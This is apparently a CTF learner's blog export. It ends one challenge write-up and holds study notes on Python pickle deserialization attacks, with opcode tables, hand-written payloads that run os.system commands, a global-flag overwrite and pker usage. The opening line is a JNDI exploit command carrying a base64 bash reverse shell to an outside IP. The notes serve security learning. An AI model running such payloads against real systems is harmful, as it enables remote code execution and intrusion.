<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNDQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="number">1.117</span>.<span class="number">144.41</span></span><br></pre></td></tr></table></figure>

<p>pdf插入payload</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427234433-p9c1ntp.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427234415-7nlu79x.png" alt="image.png"></p>
<h1 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h1><p>并发可以写入，比赛的时候写进去了，但是当时环境有问题，之后修复环境之后一血就没了</p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>pickle反序列化学习</title>
    <url>/2022/02/22/pickle/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己学习pickle反序列化整理的笔记（个人向</p>
<h1 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h1><p>pickle 序列化就是将一个 python 对象变成可以持久化储存的二进制数据，反序列化即为相反的操作，将二进制数据转回 python 对象。</p>
<h2 id="学习基础的pickle-opcode-v0"><a href="#学习基础的pickle-opcode-v0" class="headerlink" title="学习基础的pickle opcode(v0)"></a>学习基础的pickle opcode(v0)</h2><p>速查：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span></span><br><span class="line"><span class="comment"># here is in kind-of alphabetical order of 1-character pickle code.</span></span><br><span class="line"><span class="comment"># pickletools groups them by purpose.</span></span><br><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b&#x27;\x96&#x27;</span>  <span class="comment"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b&#x27;\x97&#x27;</span>  <span class="comment"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b&#x27;\x98&#x27;</span>  <span class="comment"># make top of stack readonly</span></span><br></pre></td></tr></table></figure>

<p><strong>换行符</strong>代表参数的结束</p>
<p>( 为压入一个 mark object，用以构建 tuple、list 等对象或调用函数时标识数据的<strong>开始位置</strong></p>
<p>. 为每个 pickle 序列化数据都必须有的结束标识符</p>
<p> I为压入整数，接收一个整数参数，其后跟一个换行符表示参数结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b&#x27;I12345\n.&#x27;</span>)</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure>

<p>0 执行 POP 操作，1 针对 mark object 执行 POP 操作，2 复制栈顶元素，即将栈顶元素再次入栈</p>
<p>d l t 分别从栈中数据创建 dict、list、tuple 对象，以 mark object 标识数据开始，并会将数据和 mark object 从栈中移除</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = <span class="string">b&quot;&quot;&quot;(S&#x27;a&#x27;</span></span><br><span class="line"><span class="string">S&#x27;b&#x27;</span></span><br><span class="line"><span class="string">S&#x27;c&#x27;</span></span><br><span class="line"><span class="string">S&#x27;d&#x27;</span></span><br><span class="line"><span class="string">t.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>: (    MARK</span><br><span class="line">    <span class="number">1</span>: S        STRING     <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    <span class="number">6</span>: S        STRING     <span class="string">&#x27;b&#x27;</span></span><br><span class="line">   <span class="number">11</span>: S        STRING     <span class="string">&#x27;c&#x27;</span></span><br><span class="line">   <span class="number">16</span>: S        STRING     <span class="string">&#x27;d&#x27;</span></span><br><span class="line">   <span class="number">21</span>: t        TUPLE      (MARK at <span class="number">0</span>)</span><br><span class="line">   <span class="number">22</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><code>&#125;</code> <code>]</code> <code>)</code> 分别将空 dict、空 list、空 tuple对象压入栈中，后续可以使用其它方法对这些对象进行操作</p>
<p><code>s</code> 将栈顶的两个元素以 key-value 的格式放入其后的 dict 中，对应 <code>dict[key]=value</code> 操作</p>
<p><code>u</code> 为添加多个 key-value，操作与 <code>d</code> 类似</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data3 = <span class="string">b&quot;&quot;&quot;&#125;S&#x27;a&#x27;</span></span><br><span class="line"><span class="string">S&#x27;b&#x27;</span></span><br><span class="line"><span class="string">s.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;b&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>a</code> 将栈顶元素放入其后的 list 中，对应 <code>list.append(value)</code> 操作</p>
<p><code>e</code> 为添加多个元素，操作与 <code>l</code> 类似</p>
<p><code>b</code> 用于修改栈中的对象，调用对应类设定的 <code>__setstate__</code> 函数 (若有) 或默认的 <code>__dict__.update</code> 来修改对象的元素，栈顶为调用 update 的参数，需要一个 dict 参数，后一个元素为对应修改的对象</p>
<p>修改对象属性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">data4 = <span class="string">b&quot;&quot;&quot;c__main__</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">(S&#x27;a&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db.&quot;&quot;&quot;</span></span><br><span class="line">pickle.loads(data4)</span><br><span class="line"><span class="built_in">print</span>(a.a)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>0: c    GLOBAL     &#39;__main__ a&#39;  
12: (    MARK  
13: S        STRING     &#39;a&#39;  
18: I        INT        1  
21: d        DICT       (MARK at 12)  
22: b    BUILD  
23: .    STOP  
highest protocol among opcodes = 0&lt;br /&gt;

c	push self.find_class(modname, name);

这里是用c find到了对象a

然后b调用函数来修改对象中的属性，因为要求传入一个dict所以调用d，上面压入的是两个参数

栈底是要修改的对象a，栈顶是传入的参数，很好理解
</code></pre>
</blockquote>
<p><code>c</code> 为最常见的 opcode 之一，其作用可以归结为调用 <code>find_class</code> 方法并将结果入栈，其接收两个参数，第一个参数为 <code>modname</code>，第二个参数为 <code>name</code></p>
<ul>
<li><code>p</code> <code>q</code> <code>r</code> 将栈顶的元素放入 memo (一个临时使用的内存) 中，其接收一个参数，为该元素在 memo 中的索引，区别在于索引的类型不同<br><code>g</code> <code>h</code> <code>j</code> 与之相对应，接收一个参数作为索引，在 memo 中寻找该索引对应的元素放入栈顶<br>这三对 opcode 一般用于弹出或修改非栈顶元素时，将栈顶元素临时保存</li>
</ul>
<p><code>R</code> 为最常被过滤的 opcode，其由特殊方法 <strong>reduce</strong> 产生，对栈顶的 tuple 进行 callable 操作，第一个元素为一个可调用的对象 (一般通过 c 获取)，第二个元素为一个 tuple 储存调用的参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">b&quot;&quot;&quot;ctime</span></span><br><span class="line"><span class="string">sleep</span></span><br><span class="line"><span class="string">(I5</span></span><br><span class="line"><span class="string">tp0</span></span><br><span class="line"><span class="string">R.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(data)</span><br><span class="line"></span><br><span class="line">等效于time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p><code>i</code> <code>o</code> 均用于创建类的实例，也可用于调用方法，其区别在于使用方法和参数传递方法的不同</p>
<p><code>i</code> 接收两个参数 (在 opcode 后跟参数)，分别对应 <code>modname</code> 与 <code>name</code>，创建实例或调用方法所用参数为使用 <code>i</code> 时栈内内容，以 mark object 标识数据开始</p>
<p>创建对象：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line"></span><br><span class="line">data1 = <span class="string">b&quot;&quot;&quot;(S&#x27;aaa&#x27;</span></span><br><span class="line"><span class="string">S&#x27;bbb&#x27;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">A</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(data1).a)</span><br></pre></td></tr></table></figure>

<p>调用方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = <span class="string">b&quot;&quot;&quot;(S&#x27;hello&#x27;</span></span><br><span class="line"><span class="string">S&#x27;world&#x27;</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">.&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>o</code> 不接收参数，其使用栈上的元素，以 mark object 标识数据开始，<strong>第一个元素为类或可调用的对象</strong>，之后的元素为其参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data3 = <span class="string">b&quot;&quot;&quot;(c__main__</span></span><br><span class="line"><span class="string">A</span></span><br><span class="line"><span class="string">S&#x27;aaa&#x27;</span></span><br><span class="line"><span class="string">S&#x27;bbb&#x27;</span></span><br><span class="line"><span class="string">o.&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(data3).a)</span><br><span class="line"></span><br><span class="line">data4 = <span class="string">b&quot;&quot;&quot;(c__builtin__</span></span><br><span class="line"><span class="string">print</span></span><br><span class="line"><span class="string">S&#x27;aaa&#x27;</span></span><br><span class="line"><span class="string">S&#x27;bbb&#x27;</span></span><br><span class="line"><span class="string">S&#x27;ccc&#x27;</span></span><br><span class="line"><span class="string">o.&quot;&quot;&quot;</span></span><br><span class="line">pickle.loads(data4)</span><br></pre></td></tr></table></figure>

<h2 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h2><p>pickle.loads是一个供我们调用的接口。其底层实现是基于_Unpickler类。</p>
<p><img src="https://o.130014.xyz/2022/02/22/image-20220222112451-q81gntp.png" alt="image.png"></p>
<pre><code>栈是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。

存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。
</code></pre>
<p>pickle协议是向前兼容的</p>
<h2 id="基础利用方法"><a href="#基础利用方法" class="headerlink" title="基础利用方法"></a>基础利用方法</h2><h3 id="执行恶意命令"><a href="#执行恶意命令" class="headerlink" title="执行恶意命令"></a>执行恶意命令</h3><p>可以直接调用__reduce__方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Evil()))</span><br><span class="line">pickletools.dis(pickle.dumps(Evil()))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line">    <span class="number">2</span>: \x95 FRAME      <span class="number">30</span></span><br><span class="line">   <span class="number">11</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;nt&#x27;</span></span><br><span class="line">   <span class="number">15</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">0</span>)</span><br><span class="line">   <span class="number">16</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   <span class="number">24</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">1</span>)</span><br><span class="line">   <span class="number">25</span>: \x93 STACK_GLOBAL</span><br><span class="line">   <span class="number">26</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">2</span>)</span><br><span class="line">   <span class="number">27</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">35</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">3</span>)</span><br><span class="line">   <span class="number">36</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">37</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">4</span>)</span><br><span class="line">   <span class="number">38</span>: R    REDUCE</span><br><span class="line">   <span class="number">39</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">5</span>)</span><br><span class="line">   <span class="number">40</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>可以看到用到了R</p>
<p>也可以手写opcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line"><span class="built_in">getattr</span></span><br><span class="line">(c__builtin__</span><br><span class="line"><span class="built_in">__import__</span></span><br><span class="line">(S<span class="string">&#x27;os&#x27;</span></span><br><span class="line">tRS<span class="string">&#x27;system&#x27;</span></span><br><span class="line">tR(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>

<p>1~2行获取__builtin__.getattr函数</p>
<p>3~6行 通过<code>__builtin__.__import__</code>函数导入os模块</p>
<p>6~7行获取os.system</p>
<p>7~8行调用函数执行命令</p>
<p>若使用pker:<a href="https://github.com/EddieIvan01/pker">link</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">system = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)(os, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>也可以用o和i来构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>


<h3 id="修改全局变量"><a href="#修改全局变量" class="headerlink" title="修改全局变量"></a>修改全局变量</h3><p>通过 <code>c</code> 操作码可以获取到任意对象，<code>b</code> 操作码可以对任意对象进行修改，此时就可以获取全局对象并进行修改</p>
<p>比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret = &#123;<span class="string">&#x27;ADMIN&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">if</span> secret.ADMIN == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>如果想要修改secret里的变量，可以调用</p>
<p><code>__main__.secret.update(&#123;&#39;ADMIN&#39;: 1&#125;)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line"><span class="built_in">getattr</span></span><br><span class="line">(c__main__</span><br><span class="line">secret</span><br><span class="line">S<span class="string">&#x27;update&#x27;</span></span><br><span class="line">tR((S<span class="string">&#x27;ADMIN&#x27;</span></span><br><span class="line">I1</span><br><span class="line">dtR.</span><br></pre></td></tr></table></figure>


<p>pker</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret = GLOBAL(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">update = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)(secret, <span class="string">&#x27;update&#x27;</span>)</span><br><span class="line">update(&#123;<span class="string">&#x27;ADMIN&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h3 id="获取其它模块中的隐私数据"><a href="#获取其它模块中的隐私数据" class="headerlink" title="获取其它模块中的隐私数据"></a>获取其它模块中的隐私数据</h3><h2 id="绕过过滤方法"><a href="#绕过过滤方法" class="headerlink" title="绕过过滤方法"></a>绕过过滤方法</h2><p>官方针对pickle的安全问题的建议是修改find_class()，引入白名单的方式来解决</p>
<p>很多时候都要靠python的内置模块去绕过</p>
<h2 id="pker使用"><a href="#pker使用" class="headerlink" title="pker使用"></a>pker使用</h2><p><code>https://github.com/eddieivan01/pker</code></p>
<p>自动化生成Pickle opcode</p>
<p>一般来说它可以按照python正常的写法来生成opcode</p>
<p>和普通python不同的地方再：</p>
<ul>
<li><p>3个内置的模块生成方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)         =&gt;  (S&#x27;ls&#x27;\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;)  =&gt;  (cos\nsystem\nS&#x27;ls&#x27;\no</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>return</code> 可以在函数之外使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var = 1</span><br><span class="line">return var</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return           =&gt;  .</span><br><span class="line">return var       =&gt;  g_\n.</span><br><span class="line">return 1         =&gt;  I1\n.</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="使用方法和示例"><a href="#使用方法和示例" class="headerlink" title="使用方法和示例"></a>使用方法和示例</h3><ol>
<li>pker中的针对pickle的<strong>特殊语法</strong>需要重点掌握（后文给出示例）</li>
<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
<li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
</ol>
